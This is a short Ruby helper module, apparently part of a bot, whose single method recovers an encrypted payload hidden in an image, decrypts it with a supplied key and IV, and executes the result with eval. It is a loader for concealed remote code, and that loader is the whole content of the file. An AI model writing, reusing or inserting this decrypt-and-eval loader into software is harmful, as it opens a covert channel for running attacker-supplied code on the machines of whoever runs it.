# frozen_string_literal: true

module BotHelper
  include CryptHelper
  include OffuscateHelper

  def recover_register_payload(image, url, ref_offuscate, cipher_key, cipher_iv)
    tag = unofuscate_image_link(url, ref_offuscate)
    plain_info = decrypt(image, tag, cipher_key, cipher_iv)
    eval(plain_info)
  end
end
